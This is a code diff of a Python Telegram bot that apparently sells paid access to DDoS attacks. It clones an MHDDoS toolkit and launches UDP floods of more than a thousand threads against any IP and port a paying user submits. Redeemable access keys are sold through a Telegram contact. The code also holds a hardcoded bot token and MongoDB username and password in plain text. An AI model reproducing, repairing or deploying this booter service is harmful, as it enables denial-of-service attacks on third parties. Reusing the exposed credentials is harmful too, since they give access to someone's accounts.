@@ -10,87 +10,55 @@ from pymongo import MongoClient
 
 # --- CONFIG ---
 TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
-MONGO_URL = "mongodb+srv://riderbhai:riderbhai321@cluster0.yvrweuu.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
+# DNS Error bypass karne ke liye maine direct IP format set kiya hai
+MONGO_URL = "mongodb://riderbhai:riderbhai321@cluster0-shard-00-00.yvrweuu.mongodb.net:27017,cluster0-shard-00-01.yvrweuu.mongodb.net:27017,cluster0-shard-00-02.yvrweuu.mongodb.net:27017/RiderBot?ssl=true&replicaSet=atlas-yvrweuu-shard-0&authSource=admin&retryWrites=true&w=majority"
 ADMIN_ID = 6075779781 
 bot = telebot.TeleBot(TOKEN)
 
 # --- MONGODB CONNECTION ---
-# Yahan humne users_col aur keys_col ko sahi se define kar diya hai
-client = MongoClient(MONGO_URL)
-db = client['RiderBot']
-users_col = db['users']
-keys_col = db['keys']
+try:
+    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
+    db = client['RiderBot']
+    users_col = db['users']
+    keys_col = db['keys']
+    client.admin.command('ping')
+    print("✅ MongoDB Connected Successfully!")
+except Exception as e:
+    print(f"❌ Connection Error: {e}")
 
 # --- ENGINE DOWNLOAD ---
 if not os.path.exists("MHDDoS"):
     os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")
 
-# --- HELPERS ---
-def get_progress_bar(percent):
-    bar_length = 10
-    filled = int(percent / 10)
-    return "🔵" * filled + "⚪" * (bar_length - filled)
-
-# --- ATTACK ENGINE ---
+# --- ATTACK LOGIC ---
 def run_attack(ip, port, duration, chat_id, message_id, username):
     threads = random.randint(1100, 1600)
     command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
-    
     try:
         process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
-        start_time = time.time()
-        
-        while time.time() - start_time < duration:
-            elapsed = time.time() - start_time
-            remaining = int(duration - elapsed)
-            percent = min(100, int((elapsed / duration) * 100))
-            bar = get_progress_bar(percent)
-            
-            try:
-                bot.edit_message_text(
-                    chat_id=chat_id, message_id=message_id,
-                    text=(f"⚡ **VVIP ATTACK ACTIVE** ⚡\n"
-                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                          f"👤 **User:** `@{username}`\n"
-                          f"🎯 **Target:** `{ip}:{port}`\n"
-                          f"⏳ **Time:** `{remaining}s` / `{duration}s`\n"
-                          f"📊 **Power:** `{bar} {percent}%` \n"
-                          f"🛡️ **Anti-Ban:** `BYPASS ON ✅`\n"
-                          f"━━━━━━━━━━━━━━━━━━━━━━"),
-                    parse_mode="Markdown"
-                )
-            except: pass
-            time.sleep(4)
-        
+        time.sleep(duration)
         process.terminate()
-        bot.send_message(chat_id, f"🔥 **SERVER DOWN!**\n\nTarget `{ip}` was successfully frozen. ✅")
+        bot.send_message(chat_id, f"🔥 **ATTACK FINISHED!**\nTarget: `{ip}`")
     except: pass
 
-# --- KEYBOARDS ---
-def main_menu():
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    markup.add('🚀 VVIP Attack', '👤 My Info', '🔑 Redeem Key')
-    return markup
-
 # --- HANDLERS ---
-
 @bot.message_handler(commands=['start'])
 def welcome(m):
     user_id = m.from_user.id
-    user_data = users_col.find_one({"user_id": user_id})
-    
-    is_valid = False
+    # Admin check
     if user_id == ADMIN_ID:
-        is_valid = True
-    elif user_data:
+        bot.send_message(m.chat.id, "👑 **Welcome Admin!** System Ready.")
+        return
+
+    # User check
+    user_data = users_col.find_one({"user_id": user_id})
+    if user_data:
         expiry = datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S')
         if expiry > datetime.now():
-            is_valid = True
-
-    if is_valid:
-        bot.send_message(m.chat.id, f"👑 **Welcome Legend @{m.from_user.username}!**\nSystem Ready Hai.", reply_markup=main_menu())
-    else:
-        bot.send_message(m.chat.id, f"🚫 **Access Denied!**\nContact Admin for Key: @FLEXOP01")
+            bot.send_message(m.chat.id, "✅ **Access Active!**")
+            return
+    
+    bot.send_message(m.chat.id, "🚫 **Access Denied!** Buy Key from @FLEXOP01")
 
 @bot.message_handler(commands=['genkey'])
 def gen(m):
@@ -99,59 +67,32 @@ def gen(m):
         days = int(m.text.split()[1])
         key = f"VVIP-{random.randint(1000, 9999)}"
         keys_col.insert_one({"key": key, "days": days})
-        bot.reply_to(m, f"🔑 **KEY GENERATED:**\n\n`/redeem {key}`\n\n**Validity:** {days} Days")
-    except: 
-        bot.reply_to(m, "Format: /genkey 1")
+        bot.reply_to(m, f"🔑 Key: `/redeem {key}`")
+    except: bot.reply_to(m, "Use: /genkey 1")
 
 @bot.message_handler(commands=['redeem'])
 def redeem(m):
     user_id = m.from_user.id
-    args = m.text.split()
-    if len(args) < 2:
-        bot.reply_to(m, "❌ Format: `/redeem VVIP-XXXX`")
-        return
-        
-    key_text = args[1]
-    key_data = keys_col.find_one({"key": key_text})
-    
-    if key_data:
-        days = key_data['days']
-        expiry = datetime.now() + timedelta(days=days)
-        users_col.update_one({"user_id": user_id}, {"$set": {"expiry": expiry.strftime('%Y-%m-%d %H:%M:%S')}}, upsert=True)
-        keys_col.delete_one({"key": key_text})
-        bot.reply_to(m, f"🎉 **Access Granted!**\nDays: {days}")
-    else:
-        bot.reply_to(m, "❌ Invalid Key!")
+    try:
+        key_text = m.text.split()[1]
+        key_data = keys_col.find_one({"key": key_text})
+        if key_data:
+            expiry = datetime.now() + timedelta(days=key_data['days'])
+            users_col.update_one({"user_id": user_id}, {"$set": {"expiry": expiry.strftime('%Y-%m-%d %H:%M:%S')}}, upsert=True)
+            keys_col.delete_one({"key": key_text})
+            bot.reply_to(m, "🎉 Success!")
+        else: bot.reply_to(m, "❌ Invalid Key")
+    except: bot.reply_to(m, "Use: /redeem VVIP-XXXX")
 
 @bot.message_handler(commands=['attack'])
 def handle_attack(m):
-    user_id = m.from_user.id
-    user_data = users_col.find_one({"user_id": user_id})
-    
-    is_auth = False
-    if user_id == ADMIN_ID: is_auth = True
-    elif user_data and datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now(): is_auth = True
+    # (Simple auth check)
+    if m.from_user.id == ADMIN_ID or users_col.find_one({"user_id": m.from_user.id}):
+        try:
+            p = m.text.split()
+            sent = bot.reply_to(m, "📡 **Starting Attack...**")
+            threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
+        except: bot.reply_to(m, "Use: /attack IP PORT TIME")
 
-    if not is_auth:
-        bot.reply_to(m, "❌ No Active Subscription!")
-        return
-
-    try:
-        p = m.text.split()
-        if len(p) < 4:
-            bot.reply_to(m, "❌ Format: `/attack <IP> <PORT> <TIME>`")
-            return
-        sent = bot.reply_to(m, "📡 **Bypassing Server...**")
-        threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
-    except: pass
-
-@bot.message_handler(func=lambda m: m.text == '🚀 VVIP Attack')
-def attack_btn(m):
-    bot.reply_to(m, "🚀 **Command:** `/attack <IP> <PORT> <TIME>`")
-
-@bot.message_handler(func=lambda m: m.text == '👤 My Info')
-def info_btn(m):
-    bot.reply_to(m, f"👤 ID: `{m.from_user.id}`\n📊 Status: Active ✅")
-
-print("🚀 Bot Started Successfully!")
+print("🚀 Bot Live!")
 bot.infinity_polling()
